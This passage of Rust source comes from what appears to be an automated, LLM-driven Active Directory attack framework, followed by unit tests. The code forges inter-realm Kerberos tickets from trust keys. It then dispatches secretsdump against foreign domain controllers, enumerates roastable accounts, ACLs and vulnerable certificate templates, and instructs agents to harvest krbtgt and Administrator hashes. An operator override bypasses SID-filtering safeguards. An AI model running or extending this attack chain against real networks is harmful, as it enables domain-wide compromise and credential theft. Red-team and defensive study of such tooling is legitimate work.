    target_domain: String,
    target_dc_ip: Option<String>,
    source_domain_sid: Option<String>,
    target_domain_sid: Option<String>,
}

/// Submit a cross-forest user-enumeration recon task immediately after a
/// successful inter-realm ticket forge.
///
/// Without this, `auto_cross_forest_enum` would refuse to dispatch (its
/// `best_cred` returns None when the target forest has no credentials in
/// state) and the freshly-forged ticket would sit idle. This helper queues
/// the same `ldap_user_enumeration` recon payload using any usable
/// source-domain credential as a placeholder; the credential resolver
/// detects the cross-forest LDAP tool, finds no NTLM hash for the target,
/// and injects the inter-realm ccache via `resolve_cross_forest_ticket`.
/// Attempt secretsdump against the target DC immediately after the inter-realm
/// ticket is forged. The ccache already contains a `cifs/<dc>` service ticket,
/// so the credential resolver can inject it for secretsdump. This fails fast
/// (~5 s) when SID filtering is active and Administrator@source has no
/// replication rights in the target, but succeeds immediately when the trust
/// is misconfigured — avoiding the wait for an alternative pivot path.
async fn dispatch_post_ticket_secretsdump(
    dispatcher: &Dispatcher,
    source_domain: &str,
    target_domain: &str,
) {
    let target_lower = target_domain.to_lowercase();

    let (target_dc_ip, target_dc_fqdn, source_cred) = {
        let s = dispatcher.state.read().await;
        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
            warn!(
                source_domain,
                target_domain, "post-ticket secretsdump skipped: no DC IP for target domain"
            );
            return;
        };
        let dc_fqdn = s
            .hosts
            .iter()
            .find(|h| h.ip == dc_ip && !h.hostname.is_empty())
            .map(|h| {
                let hn = h.hostname.to_lowercase();
                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
                    hn
                } else {
                    format!("{hn}.{target_lower}")
                }
            });
        let cred = s
            .credentials
            .iter()
            .find(|c| {
                !c.password.is_empty()
                    && is_domain_related(&c.domain, source_domain)
                    && !s.is_principal_quarantined(&c.username, &c.domain)
            })
            .cloned();
        (dc_ip, dc_fqdn, cred)
    };

    let Some(cred) = source_cred else {
        warn!(
            source_domain,
            target_domain,
            "post-ticket secretsdump skipped: no source-domain credential to seed the task"
        );
        return;
    };

    let target = target_dc_fqdn.unwrap_or_else(|| target_dc_ip.clone());

    let payload = json!({
        "technique": "secretsdump",
        "target": target,
        "dc_ip": target_dc_ip,
        "domain": target_domain,
        "bind_domain": source_domain,
        "credential": {
            "username": cred.username,
            "password": cred.password,
            "domain": cred.domain,
        },
        "cross_forest": true,
        "instructions": concat!(
            "Cross-forest secretsdump after inter-realm Kerberos ticket forge. ",
            "An inter-realm ccache (cifs/ + ldap/ service tickets) for this target ",
            "domain has been pre-cached and will be auto-injected by the credential ",
            "resolver. Run secretsdump with Kerberos auth (-k flag / KRB5CCNAME) ",
            "against the target DC. Do NOT use the supplied password credential for ",
            "auth — use the injected Kerberos ticket instead.\n\n",
            "If secretsdump succeeds, call publish_credential/publish_hash for every ",
            "hash returned, especially krbtgt and Administrator."
        ),
    });

    let priority = dispatcher.effective_priority("cross_forest_enum");
    match dispatcher
        .throttled_submit("credential_access", "credential_access", payload, priority)
        .await
    {
        Ok(Some(task_id)) => {
            info!(
                task_id = %task_id,
                source_domain,
                target_domain,
                target_dc = %target,
                "Post-ticket cross-forest secretsdump dispatched"
            );
        }
        Ok(None) => {
            debug!(
                source_domain,
                target_domain, "Post-ticket secretsdump deferred by throttling"
            );
        }
        Err(e) => {
            warn!(
                err = %e,
                source_domain,
                target_domain,
                "Failed to submit post-ticket secretsdump task"
            );
        }
    }
}

async fn dispatch_post_ticket_user_enumeration(
    dispatcher: &Dispatcher,
    source_domain: &str,
    target_domain: &str,
) {
    let target_lower = target_domain.to_lowercase();

    let (target_dc_ip, target_dc_fqdn, source_cred) = {
        let s = dispatcher.state.read().await;
        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
            warn!(
                source_domain,
                target_domain, "post-ticket user-enum skipped: no DC IP for target domain"
            );
            return;
        };
        let dc_fqdn = s
            .hosts
            .iter()
            .find(|h| h.ip == dc_ip && !h.hostname.is_empty())
            .map(|h| {
                let hn = h.hostname.to_lowercase();
                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
                    hn
                } else {
                    format!("{hn}.{target_lower}")
                }
            });
        // Pick any non-empty-password credential from the source forest. The
        // resolver will swap the cred for the ticket; what matters is that
        // bind_domain ends up != target_domain so the cross-forest path is
        // taken. We accept child-domain creds (e.g. child.contoso.local
        // when source is contoso.local) because intermediate ops often
        // only own the child realm — the trust key extraction still uses the
        // parent's outbound trust, but state.credentials only holds the
        // identities we cracked along the way.
        let cred = s
            .credentials
            .iter()
            .find(|c| {
                !c.password.is_empty()
                    && is_domain_related(&c.domain, source_domain)
                    && !s.is_principal_quarantined(&c.username, &c.domain)
            })
            .cloned();
        (dc_ip, dc_fqdn, cred)
    };

    let Some(cred) = source_cred else {
        warn!(
            source_domain,
            target_domain,
            "post-ticket user-enum skipped: no source-domain credential to seed the task"
        );
        return;
    };

    let target = target_dc_fqdn.unwrap_or_else(|| target_dc_ip.clone());

    let payload = json!({
        "technique": "ldap_user_enumeration",
        "target_ip": target,
        "domain": target_domain,
        "bind_domain": source_domain,
        "credential": {
            "username": cred.username,
            "password": cred.password,
            "domain": cred.domain,
        },
        "filters": ["(objectCategory=person)(objectClass=user)"],
        "attributes": [
            "sAMAccountName", "description", "memberOf",
            "userAccountControl", "servicePrincipalName",
            "msDS-AllowedToDelegateTo", "adminCount"
        ],
        "cross_forest": true,
        "instructions": concat!(
            "Cross-forest user enumeration after inter-realm Kerberos ticket forge. ",
            "An inter-realm ccache for this target domain has been pre-cached and ",
            "will be auto-injected by the credential resolver. Use ",
            "`ldap_search_descriptions` (or `ldap_search`) against the target DC ",
            "FQDN — these tools perform GSSAPI bind with the injected ticket. Do ",
            "NOT use the supplied password credential for the bind (it is from a ",
            "different forest and will be rejected); the ticket handles auth.\n\n",
            "Report every user found with EXACTLY this JSON format in ",
            "discovered_users:\n",
            "  {\"username\": \"samaccountname\", \"domain\": \"target.domain\", ",
            "\"source\": \"ldap_enumeration\", \"memberOf\": [\"Group1\"]}\n",
            "Flag DoesNotRequirePreAuth as vuln_type='asrep_roastable' and SPNs as ",
            "vuln_type='kerberoastable'. For those findings set the finding `target` to ",
            "the affected account's sAMAccountName (not an IP or DC hostname) so it is roasted."
        ),
    });

    let priority = dispatcher.effective_priority("cross_forest_enum");
    match dispatcher
        .throttled_submit("recon", "recon", payload, priority)
        .await
    {
        Ok(Some(task_id)) => {
            info!(
                task_id = %task_id,
                source_domain,
                target_domain,
                target_dc = %target,
                "Post-ticket cross-forest user enumeration dispatched"
            );
        }
        Ok(None) => {
            debug!(
                source_domain,
                target_domain, "Post-ticket user-enum deferred by throttling"
            );
        }
        Err(e) => {
            warn!(
                err = %e,
                source_domain,
                target_domain,
                "Failed to submit post-ticket user-enum task"
            );
        }
    }
}

/// Run ACL enumeration directly with the forged inter-realm ticket.
///
/// The LLM-routed ACL fallback often burns a turn trying the placeholder
/// password before the resolver flips to GSSAPI. Dispatching the Kerberos
/// LDAP tool directly keeps the SID-filtered trust path productive: parser
/// discoveries from `ldap_acl_enumeration` feed DACL/RBCD/shadow-credential
/// automations without waiting for another recon agent round.
async fn dispatch_post_ticket_acl_enumeration(
    dispatcher: &Dispatcher,
    source_domain: &str,
    target_domain: &str,
) {
    let target_lower = target_domain.to_lowercase();

    let (target_dc_ip, target_dc_fqdn) = {
        let s = dispatcher.state.read().await;
        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
            warn!(
                source_domain,
                target_domain, "post-ticket ACL enum skipped: no DC IP for target domain"
            );
            return;
        };
        let dc_fqdn = s
            .hosts
            .iter()
            .find(|h| h.ip == dc_ip && !h.hostname.is_empty())
            .map(|h| {
                let hn = h.hostname.to_lowercase();
                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
                    hn
                } else {
                    format!("{hn}.{target_lower}")
                }
            });
        (dc_ip, dc_fqdn)
    };

    let target = target_dc_fqdn.unwrap_or_else(|| target_dc_ip.clone());
    let tool_args = json!({
        "target": target,
        "target_ip": target_dc_ip,
        "domain": target_domain,
        "username": "Administrator",
        "bind_domain": source_domain,
    });
    let call = ToolCall {
        id: format!("post_ticket_acl_{}", uuid::Uuid::new_v4().simple()),
        name: "ldap_acl_enumeration".to_string(),
        arguments: tool_args,
    };
    let task_id = format!(
        "post_ticket_acl_{}",
        &uuid::Uuid::new_v4().simple().to_string()[..12]
    );

    info!(
        task_id = %task_id,
        source_domain,
        target_domain,
        "Post-ticket ACL enumeration dispatched (direct Kerberos LDAP tool)"
    );

    match dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("recon", &task_id, &call)
        .await
    {
        Ok(exec) => {
            if let Some(err) = exec.error {
                warn!(
                    err = %err,
                    source_domain,
                    target_domain,
                    "Post-ticket ACL enumeration returned tool error"
                );
                return;
            }
            let vuln_count = exec
                .discoveries
                .as_ref()
                .and_then(|d| d.get("vulnerabilities"))
                .and_then(|v| v.as_array())
                .map(|v| v.len())
                .unwrap_or(0);
            info!(
                source_domain,
                target_domain, vuln_count, "Post-ticket ACL enumeration completed"
            );
        }
        Err(e) => warn!(
            err = %e,
            source_domain,
            target_domain,
            "Post-ticket ACL enumeration dispatch failed"
        ),
    }
}

/// True when `cred` can enumerate `target_domain`'s CA as a *native* principal:
/// a same-domain, non-machine account with a recovered password. A native
/// enrollee is a member of the target's Domain Users, so certipy flags
/// enrollee-supplies-subject templates (ESC1) as vulnerable-for-us; the forged
/// cross-forest Administrator is not, leaving them undiscovered. Delegation and
/// quarantine exclusions are applied by the caller (they need `&StateInner`).
fn is_native_adcs_enum_candidate(
    cred: &ares_core::models::Credential,
    target_domain: &str,
) -> bool {
    !cred.password.is_empty()
        && cred.domain.eq_ignore_ascii_case(target_domain)
        && !cred.username.trim_end().ends_with('$')
}

/// Outcome of one post-ticket `certipy find` dispatch.
enum AdcsEnumOutcome {
    /// certipy find completed and surfaced this many vulnerabilities.
    Found(usize),
    /// The tool errored or the dispatch itself failed — nothing was enumerated.
    Failed,
}

/// Dispatch a single post-ticket `certipy find` against `target_domain`'s CA as
/// `principal`, log the result, and report whether it surfaced vulnerabilities.
/// `native` only labels the log line (true = same-domain enrollee, false = the
/// forged cross-forest Administrator).
async fn run_post_ticket_adcs_enum(
    dispatcher: &Dispatcher,
    source_domain: &str,
    target_domain: &str,
    target_dc_ip: &str,
    principal: &str,
    native: bool,
) -> AdcsEnumOutcome {
    let tool_args = json!({
        "domain": target_domain,
        "dc_ip": target_dc_ip,
        "username": principal,
    });
    let call = ToolCall {
        id: format!("post_ticket_adcs_{}", uuid::Uuid::new_v4().simple()),
        name: "certipy_find".to_string(),
        arguments: tool_args,
    };
    let task_id = format!(
        "post_ticket_adcs_{}",
        &uuid::Uuid::new_v4().simple().to_string()[..12]
    );

    info!(
        task_id = %task_id,
        source_domain,
        target_domain,
        principal,
        native,
        "Post-ticket ADCS enumeration dispatched"
    );

    match dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("privesc", &task_id, &call)
        .await
    {
        Ok(exec) => {
            if let Some(err) = exec.error {
                warn!(
                    err = %err,
                    source_domain,
                    target_domain,
                    principal,
                    "Post-ticket ADCS enumeration returned tool error"
                );
                return AdcsEnumOutcome::Failed;
            }
            let vuln_count = exec
                .discoveries
                .as_ref()
                .and_then(|d| d.get("vulnerabilities"))
                .and_then(|v| v.as_array())
                .map(|v| v.len())
                .unwrap_or(0);
            info!(
                source_domain,
                target_domain, principal, vuln_count, "Post-ticket ADCS enumeration completed"
            );
            AdcsEnumOutcome::Found(vuln_count)
        }
        Err(e) => {
            warn!(
                err = %e,
                source_domain,
                target_domain,
                principal,
                "Post-ticket ADCS enumeration dispatch failed"
            );
            AdcsEnumOutcome::Failed
        }
    }
}

/// Enumerate ADCS templates and CAs in the target forest with the forged
/// inter-realm ticket.
///
/// The foreign CA rejects NTLM RPC (`ept_s_not_registered` /
/// `rpc_s_access_denied`) across a SID-filtered trust, so the LLM's ADCS recon
/// stalls there. certipy authenticates its LDAP + CA RPC over `-k -no-pass`
/// (KRB5CCNAME) once the credential resolver injects `ticket_path` for the
/// target realm — the certipy subset of Bug B, gated by
/// `is_cross_forest_certipy_tool` and keyed off the `domain` argument set here.
/// Running `certipy find` directly surfaces ESC1/2/3/4/9/13/15 templates into
/// state so the ADCS automations (which now issue `certipy req` with the same
/// ccache) have targets without waiting for another recon round.
///
/// Principal selection: prefer a native target-domain enrollee (see
/// `is_native_adcs_enum_candidate`) because only a Domain Users member gets
/// certipy to flag the enrollee-supplies-subject (ESC1) templates as
/// vulnerable-for-us. Fall back to the forged cross-forest Administrator when no
/// native credential exists *or* when the native bind surfaced nothing — a
/// recovered password can be stale/rotated, and a failed native bind must not
/// leave the CA un-enumerated. The Administrator ccache path is what the
/// pre-native code always used; it soft-skips when no forged ccache exists
/// rather than attempting a doomed cross-forest NTLM bind.
async fn dispatch_post_ticket_adcs_enumeration(
    dispatcher: &Dispatcher,
    source_domain: &str,
    target_domain: &str,
) {
    let (target_dc_ip, native_user) = {
        let s = dispatcher.state.read().await;
        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
            warn!(
                source_domain,
                target_domain, "post-ticket ADCS enum skipped: no DC IP for target domain"
            );
            return;
        };
        let native_user = s
            .credentials
            .iter()
            .find(|c| {
                is_native_adcs_enum_candidate(c, target_domain)
                    && !s.is_delegation_account(&c.username)
                    && !s.is_principal_quarantined(&c.username, &c.domain)
            })
            .map(|c| c.username.clone());
        (dc_ip, native_user)
    };

    // Try the native enrollee first: only it surfaces the ESC1 templates a
    // cross-forest Administrator can't. Then fall back to Administrator unless
    // that native run already found vulnerabilities — so a stale/rotated native
    // password can never leave the CA un-enumerated versus the old
    // always-Administrator behaviour.
    let native_found_vulns = if let Some(user) = &native_user {
        matches!(
            run_post_ticket_adcs_enum(
                dispatcher,
                source_domain,
                target_domain,
                &target_dc_ip,
                user,
                true,
            )
            .await,
            AdcsEnumOutcome::Found(n) if n > 0
        )
    } else {
        false
    };

    if !native_found_vulns {
        run_post_ticket_adcs_enum(
            dispatcher,
            source_domain,
            target_domain,
            &target_dc_ip,
            "Administrator",
            false,
        )
        .await;
    }
}

/// Forge an inter-realm Kerberos ticket for a SID-filtered cross-forest trust.
///
/// Called from the suppression branch of `auto_trust_follow` when
/// `is_filtered_inter_forest_trust` is true. The ExtraSid DCSync path is
/// blocked by SID filtering, but a plain inter-realm TGT is still useful:
/// bloodyad with `-k` can perform Kerberos LDAP bind against the target DC
/// as Administrator, enabling password resets and group membership changes.
///
/// The ticket is written to `/tmp/ares-tickets/<src>__<tgt>__<user>.ccache`
/// (a shared path accessible to all workers on the same host) and persisted
/// to Redis via `publish_kerberos_ticket` so the credential resolver can
/// find it when bloodyad or other LDAP-bind tools target the foreign forest.
///
/// SID resolution is opportunistic: if the source SID isn't in state yet, we
/// pass an empty string and ticketer will still produce a ticket (though some
/// KDCs reject it). This is best-effort — the fallback paths (ACL/MSSQL) are
/// the primary attack vectors; this ticket is just a bonus.
async fn dispatch_create_inter_realm_ticket(
    dispatcher: &Dispatcher,
    source_domain: &str,
    target_domain: &str,
    trust_key: &str,
    aes_key: Option<&str>,
    source_domain_sid: Option<&str>,
) {
    use ares_llm::ToolCall;

    tracing::info!(
        convergence_stage = 3,
        event = "dispatch_create_inter_realm_ticket",
        source_domain,
        target_domain,
        has_aes = aes_key.is_some(),
        has_source_sid = source_domain_sid.is_some_and(|s| !s.is_empty()),
        "convergence: dispatching inter-realm TGT forge for target realm"
    );

    let ticket_username = "Administrator";

    // Build tool args. source_sid is required by the tool — use a fallback
    // empty string and let ticketer attempt the forge; worst case the KDC
    // rejects it and the ticket write fails silently.
    let source_sid = source_domain_sid.unwrap_or("");
    if source_sid.is_empty() {
        tracing::info!(
            source_domain,
            target_domain,
            "dispatch_create_inter_realm_ticket: source SID unknown, attempting forge with empty SID"
        );
    }

    let mut tool_args = serde_json::json!({
        "trust_key":     trust_key,
        "source_sid":    source_sid,
        "source_domain": source_domain,
        "target_domain": target_domain,
        "username":      ticket_username,
    });
    if let Some(aes) = aes_key {
        tool_args["aes_key"] = serde_json::json!(aes);
    }

    // Look up the target DC so the tool can chain ldap/<dc> + cifs/<dc>
    // service-ticket fetches into the same ccache. MIT GSSAPI clients can't
    // walk a referral starting from `krbtgt/<TARGET>@<SOURCE>`; they require
    // the service ticket to already be cached. Without this, the forged
    // inter-realm TGT is unusable for `ldapsearch -Y GSSAPI`.
    {
        let s = dispatcher.state.read().await;
        let target_lower = target_domain.to_lowercase();
        if let Some(dc_ip) = s.resolve_dc_ip(target_domain) {
            let dc_fqdn = s.hosts.iter().find_map(|h| {
                if h.ip != dc_ip || h.hostname.is_empty() {
                    return None;
                }
                let hn = h.hostname.to_lowercase();
                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
                    Some(hn)
                } else {
                    Some(format!("{hn}.{target_lower}"))
                }
            });
            if let Some(fqdn) = dc_fqdn {
                tool_args["target_dc_ip"] = serde_json::json!(dc_ip);
                tool_args["target_dc_fqdn"] = serde_json::json!(fqdn);
            }
        }
    }

    let call = ToolCall {
        id: format!("create_inter_realm_{}", uuid::Uuid::new_v4().simple()),
        name: "create_inter_realm_ticket".to_string(),
        arguments: tool_args,
    };
    let task_id = format!(
        "inter_realm_ticket_{}",
        &uuid::Uuid::new_v4().simple().to_string()[..12]
    );

    tracing::info!(
        source_domain,
        target_domain,
        task_id = %task_id,
        args = %ares_tools::redact::redact_tool_arguments(&call.arguments),
        "Dispatching create_inter_realm_ticket for SID-filtered trust (Kerberos LDAP path)"
    );

    match dispatcher
        .llm_runner
        .tool_dispatcher()
        .dispatch_tool("privesc", &task_id, &call)
        .await
    {
        Ok(result) => {
            if result.error.is_some() {
                tracing::warn!(
                    source_domain,
                    target_domain,
                    error = ?result.error,
                    "create_inter_realm_ticket returned error"
                );
                return;
            }
            // Parse the ticket path from the tool output (ARES_TICKET_PATH=<path>).
            let ticket_path = result
                .output
                .lines()
                .find_map(|line| line.strip_prefix("ARES_TICKET_PATH="))
                .map(str::trim)
                .filter(|p| !p.is_empty())
                .map(str::to_string);

            let Some(ticket_path) = ticket_path else {
                tracing::warn!(
                    source_domain,
                    target_domain,
                    "create_inter_realm_ticket succeeded but no ARES_TICKET_PATH in output"
                );
                return;
            };

            tracing::info!(
                source_domain,
                target_domain,
                ticket_path = %ticket_path,
                "Inter-realm ticket forged — persisting for Kerberos LDAP tools"
            );
            let output_tail = ares_tools::redact::redact_text(
                &result
                    .output
                    .lines()
                    .rev()
                    .take(20)
                    .collect::<Vec<_>>()
                    .into_iter()
                    .rev()
                    .collect::<Vec<_>>()
                    .join(" | "),
            );
            tracing::debug!(
                source_domain,
                target_domain,
                output_tail = %output_tail,
                "create_inter_realm_ticket output tail"
            );

            let ticket = ares_core::models::KerberosTicket {
                source_domain: source_domain.to_string(),
                target_domain: target_domain.to_string(),
                username: ticket_username.to_string(),
                ticket_path,
                forged_at: Some(chrono::Utc::now()),
            };
            let _ = dispatcher
                .state
                .publish_kerberos_ticket(&dispatcher.queue, ticket)
                .await;

            // Without a follow-up dispatch the ticket sits idle: the foreign
            // forest has no credentials in state, so `auto_cross_forest_enum`
            // skips it (best_cred returns None), and no LDAP-bind tool ever
            // runs against the target DC. Kick off a cross-forest user-enum
            // task here so the credential resolver injects the freshly-forged
            // ticket and `ldap_search`/`ldap_search_descriptions` actually
            // populates `state.users` for the target domain.
            dispatch_post_ticket_user_enumeration(dispatcher, source_domain, target_domain).await;

            // Also try secretsdump immediately. SID filtering strips ExtraSid
            // claims (what `forge_inter_realm_and_dump` relies on), but the
            // cifs/ service ticket in this ccache authenticates as
            // Administrator@source against the target DC. If the trust is
            // misconfigured (SID filtering disabled) or the source Administrator
            // has been granted replication rights, DCSync succeeds. The attempt
            // costs ~5-10 s on failure and saves the entire MSSQL-pivot wait
            // on success.
            dispatch_post_ticket_secretsdump(dispatcher, source_domain, target_domain).await;

            dispatch_post_ticket_acl_enumeration(dispatcher, source_domain, target_domain).await;

            // Enumerate the foreign forest's CA over the same ccache. NTLM RPC
            // to a cross-forest CA is rejected; `-k -no-pass` with the forged
            // ticket is the only path that reaches it. Discovered ESC templates
            // feed the ADCS automations, which now issue `certipy req` with the
            // ccache too (Bug B, certipy subset).
            dispatch_post_ticket_adcs_enumeration(dispatcher, source_domain, target_domain).await;
        }
        Err(e) => {
            tracing::warn!(
                source_domain,
                target_domain,
                err = %e,
                "create_inter_realm_ticket dispatch error"
            );
        }
    }
}

/// Drain operator escape-hatch inter-realm forge requests and dispatch each.
///
/// `ares ops force-inter-realm-forge` RPUSHes [`ForceInterRealmForgeRequest`]
/// blobs onto `ares:op:{id}:force_forge_requests`. This runs at the top of
/// every trust tick: it LPOPs pending requests, primes the target DC into
/// state (so the forge can chain cifs/ + ldap/ service tickets even if the auto
/// path never discovered it), then calls `dispatch_create_inter_realm_ticket`
/// directly — bypassing the SID-filter suppression and trust_follow dedup that
/// gate the automatic path. Bounded per tick so a flooded list can't starve the
/// rest of the loop.
async fn drain_force_forge_requests(dispatcher: &Dispatcher) {
    use ares_core::models::ForceInterRealmForgeRequest;

    let key = ares_core::state::build_key(
        &dispatcher.config.operation_id,
        ares_core::state::KEY_FORCE_FORGE_REQUESTS,
    );
    let mut conn = dispatcher.queue.connection();

    for _ in 0..16 {
        let raw: Option<String> = match redis::cmd("LPOP").arg(&key).query_async(&mut conn).await {
            Ok(v) => v,
            Err(e) => {
                warn!(err = %e, "force_forge drain: LPOP failed");
                return;
            }
        };
        let Some(raw) = raw else {
            return; // list drained
        };
        let request: ForceInterRealmForgeRequest = match serde_json::from_str(&raw) {
            Ok(r) => r,
            Err(e) => {
                warn!(
                    err = %e,
                    raw_len = raw.len(),
                    "force_forge drain: bad request JSON, skipping"
                );
                continue;
            }
        };

        info!(
            source_domain = %request.source_domain,
            target_domain = %request.target_domain,
            "Operator force-inter-realm-forge request dequeued — dispatching (bypasses SID-filter + dedup)"
        );

        // Prime the target DC in-memory so the forge's state read resolves it.
        // Enough for the synchronous dispatch below; not persisted to Redis.
        if let Some(ip) = request.target_dc_ip.as_deref() {
            let mut state = dispatcher.state.write().await;
            state
                .domain_controllers
                .entry(request.target_domain.to_lowercase())
                .or_insert_with(|| ip.to_string());
            if let Some(fqdn) = request.target_dc_fqdn.as_deref() {
                let known = state
                    .hosts
                    .iter()
                    .any(|h| h.ip == ip && h.hostname.eq_ignore_ascii_case(fqdn));
                if !known {
                    state.hosts.push(ares_core::models::Host {
                        ip: ip.to_string(),
                        hostname: fqdn.to_string(),
                        os: String::new(),
                        roles: Vec::new(),
                        services: Vec::new(),
                        is_dc: true,
                        owned: false,
                    });
                }
            }
        }

        dispatch_create_inter_realm_ticket(
            dispatcher,
            &request.source_domain,
            &request.target_domain,
            &request.trust_key,
            request.aes_key.as_deref(),
            request.source_sid.as_deref(),
        )
        .await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn child_to_parent_vuln_id_basic() {
        assert_eq!(
            child_to_parent_vuln_id("child.contoso.local", "contoso.local"),
            "child_to_parent_child_contoso_local_contoso_local"
        );
    }

    #[test]
    fn child_to_parent_vuln_id_case_insensitive() {
        assert_eq!(
            child_to_parent_vuln_id("CHILD.Contoso.Local", "Contoso.Local"),
            "child_to_parent_child_contoso_local_contoso_local"
        );
    }

    #[test]
    fn child_to_parent_vuln_id_replaces_dots() {
        let id = child_to_parent_vuln_id("a.b.c", "d.e");
        assert!(!id.contains('.'));
        assert_eq!(id, "child_to_parent_a_b_c_d_e");
    }

    #[test]
    fn child_to_parent_vuln_id_empty_strings() {
        assert_eq!(child_to_parent_vuln_id("", ""), "child_to_parent__");
    }

    #[test]
    fn trust_event_fields_parent_to_child_is_intra_forest() {
        let (desc, techniques) =
            super::trust_escalation_event_fields("contoso.local", "child.contoso.local", "CHILD$");
        assert!(
            desc.starts_with("Parent-to-child ExtraSid escalation:"),
            "parent->child must not be described as a forest trust: {desc}"
        );
        assert_eq!(techniques, vec!["T1134.005", "T1003.006"]);
    }

    #[test]
    fn trust_event_fields_child_to_parent_is_intra_forest() {
        let (desc, techniques) = super::trust_escalation_event_fields(
            "child.contoso.local",
            "contoso.local",
            "CONTOSO$",
        );
        assert!(desc.starts_with("Child-to-parent ExtraSid escalation:"));
        assert_eq!(techniques, vec!["T1134.005", "T1003.006"]);
    }

    #[test]
    fn trust_event_fields_inter_forest_keeps_t1550() {
        let (desc, techniques) =
            super::trust_escalation_event_fields("contoso.local", "fabrikam.local", "FABRIKAM$");
        assert!(desc.starts_with("Forest trust escalation:"));
        assert_eq!(techniques, vec!["T1134.005", "T1550.003"]);
    }

    #[test]
    fn trust_event_fields_agree_with_vuln_classification() {
        for (source, target) in [
            ("contoso.local", "child.contoso.local"),
            ("child.contoso.local", "contoso.local"),
            ("contoso.local", "fabrikam.local"),
        ] {
            let (_, vuln_type, _) = super::classify_trust_escalation(source, target);
            let (desc, _) = super::trust_escalation_event_fields(source, target, "TRUST$");
            let event_says_forest = desc.starts_with("Forest trust escalation:");
            assert_eq!(
                event_says_forest,
                vuln_type == "forest_trust_escalation",
                "{source} -> {target}: vuln_type={vuln_type} but event said {desc}"
            );
        }
    }

    #[test]
    fn forest_trust_vuln_id_basic() {
        assert_eq!(
            forest_trust_vuln_id("contoso.local", "fabrikam.local"),
            "forest_trust_contoso.local_fabrikam.local"
        );
    }

    #[test]
    fn forest_trust_vuln_id_case_insensitive() {
        assert_eq!(
            forest_trust_vuln_id("CONTOSO.LOCAL", "FABRIKAM.LOCAL"),
            "forest_trust_contoso.local_fabrikam.local"
        );
    }

    #[test]
    fn forest_trust_vuln_id_empty_strings() {
        assert_eq!(forest_trust_vuln_id("", ""), "forest_trust__");
    }

    fn dc(ip: &str, hostname: &str) -> ares_core::models::Host {
        ares_core::models::Host {
            ip: ip.into(),
            hostname: hostname.into(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: true,
            owned: false,
        }
    }

    #[test]
    fn resolve_target_dc_hostname_prefers_the_record_for_the_target_dc_ip() {
        let hosts = [
            dc("192.168.58.10", "dc01.contoso.local"),
            dc("192.168.58.20", "dc02.child.contoso.local"),
        ];
        assert_eq!(
            resolve_target_dc_hostname(&hosts, "192.168.58.10", "contoso.local"),
            "dc01.contoso.local"
        );
    }

    #[test]
    fn resolve_target_dc_hostname_skips_the_zone_apex_for_a_sibling_record() {
        // The target DC's own record carries the bare-domain A record, so the
        // IP match is rejected and the suffix scan supplies the real FQDN.
        let hosts = [
            dc("192.168.58.10", "contoso.local"),
            dc("192.168.58.11", "dc01.contoso.local"),
        ];
        assert_eq!(
            resolve_target_dc_hostname(&hosts, "192.168.58.10", "contoso.local"),
            "dc01.contoso.local"
        );
    }

    #[test]
    fn resolve_target_dc_hostname_never_returns_a_child_domain_dc() {
        // Regression: `ends_with(".contoso.local")` matched the CHILD domain's
        // DC, so the parent forge asked the parent KDC for a principal in the
        // child realm — KDC_ERR_WRONG_REALM on every retry, forever. Falling
        // back to the IP is correct here: no DC record for contoso.local
        // itself is known yet.
        let hosts = [
            dc("192.168.58.10", "contoso.local"),
            dc("192.168.58.20", "dc02.child.contoso.local"),
        ];
        assert_eq!(
            resolve_target_dc_hostname(&hosts, "192.168.58.10", "contoso.local"),
            "192.168.58.10"
        );
    }

    #[test]
    fn resolve_target_dc_hostname_matches_a_grandchild_domain_no_better() {
        let hosts = [dc("192.168.58.30", "dc03.sub.child.contoso.local")];
        assert_eq!(
            resolve_target_dc_hostname(&hosts, "192.168.58.10", "contoso.local"),
            "192.168.58.10"
        );
    }

    #[test]
    fn resolve_target_dc_hostname_resolves_a_child_domain_target_directly() {
        // The child IS the target domain here, so its DC must be selected.
        let hosts = [
            dc("192.168.58.10", "dc01.contoso.local"),
            dc("192.168.58.20", "dc02.child.contoso.local"),
        ];
        assert_eq!(
            resolve_target_dc_hostname(&hosts, "192.168.58.99", "child.contoso.local"),
            "dc02.child.contoso.local"
        );
    }

    #[test]
    fn resolve_target_dc_hostname_is_case_insensitive() {
        let hosts = [dc("192.168.58.11", "DC01.CONTOSO.LOCAL")];
        assert_eq!(
            resolve_target_dc_hostname(&hosts, "192.168.58.10", "contoso.local"),
            "DC01.CONTOSO.LOCAL"
        );
    }

    #[test]
    fn resolve_target_dc_hostname_falls_back_to_ip_with_no_hosts() {
        assert_eq!(
            resolve_target_dc_hostname(&[], "192.168.58.10", "contoso.local"),
            "192.168.58.10"
        );
    }

    #[test]
    fn trust_account_name_basic() {
        assert_eq!(trust_account_name("FABRIKAM"), "FABRIKAM$");
    }

    #[test]
    fn trust_account_name_lowered_input() {
        assert_eq!(trust_account_name("fabrikam"), "FABRIKAM$");
    }

    #[test]
    fn trust_account_name_mixed_case() {
        assert_eq!(trust_account_name("Contoso"), "CONTOSO$");
    }

    #[test]
    fn trust_account_name_empty() {
        assert_eq!(trust_account_name(""), "$");
    }

    #[test]
    fn is_domain_related_exact_match() {
        assert!(is_domain_related("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_case_insensitive() {
        assert!(is_domain_related("CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_domain_related_child_of_target() {
        assert!(is_domain_related("child.contoso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_parent_of_target() {
        assert!(is_domain_related("contoso.local", "child.contoso.local"));
    }

    #[test]
    fn is_domain_related_unrelated_domains() {
        assert!(!is_domain_related("fabrikam.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_partial_suffix_no_match() {
        // "oso.local" ends with "contoso.local" substring but is not a valid child
        assert!(!is_domain_related("oso.local", "contoso.local"));
    }

    #[test]
    fn is_domain_related_empty_strings() {
        assert!(is_domain_related("", ""));
    }

